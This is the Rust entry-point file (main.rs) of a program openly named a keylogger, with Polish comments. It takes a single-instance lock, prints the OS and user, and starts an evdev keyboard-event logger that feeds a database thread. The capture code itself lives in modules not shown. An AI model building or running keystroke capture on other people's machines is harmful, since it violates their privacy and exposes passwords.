use std::error::Error;
use std::fs::{File, OpenOptions};
use std::os::unix::io::AsRawFd;
use std::sync::mpsc;

mod details;
mod evdev_logger;
mod events;
mod db;

fn acquire_lock() -> Result<File, Box<dyn Error>> {
    let lock_path = format!("{}/rust-keylogger-xinput2.lock", std::env::temp_dir().display());
    let file = OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .open(&lock_path)?;
    let fd = file.as_raw_fd();
    let res = unsafe { libc::flock(fd, libc::LOCK_EX | libc::LOCK_NB) };
    if res != 0 {
        eprintln!("[rust-keylogger] BŁĄD: Inna instancja keyloggera już działa! Blokada pliku aktywna.");
        std::process::exit(1);
    }
    Ok(file)
}

fn main() -> Result<(), Box<dyn Error>> {
    // Zapobiegaj uruchomieniu wielu instancji naraz
    let _lock = acquire_lock()?;

    let sys = details::SystemDetails::details();
    println!("OS: {}, User: {}", sys.os, sys.username);

    // Inicjalizacja kanału mpsc do komunikacji między wątkiem loggera i zapisywacza bazy danych
    let (tx, rx) = mpsc::channel();

    // Uruchomienie wątku zapisującego w tle
    db::start_db_thread(rx);

    // Run evdev event loop (blocks indefinitely)
    evdev_logger::run(tx)?;
    Ok(())
}
